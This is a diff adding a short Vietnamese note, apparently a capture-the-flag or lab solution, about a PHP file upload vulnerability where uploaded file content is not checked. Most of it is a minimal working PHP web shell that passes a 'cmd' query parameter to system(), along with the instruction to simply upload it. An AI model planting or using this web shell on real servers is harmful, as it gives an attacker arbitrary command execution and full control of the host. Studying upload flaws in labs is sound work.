@@ -1,0 +1,14 @@
+bài này liên quan để lỗ hổng php 
+ + không verify content file
+ + không verify các output
+ +....
+
+-> nó là lỗ hỗng file upload
+
+đẩy file php này lên là được
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
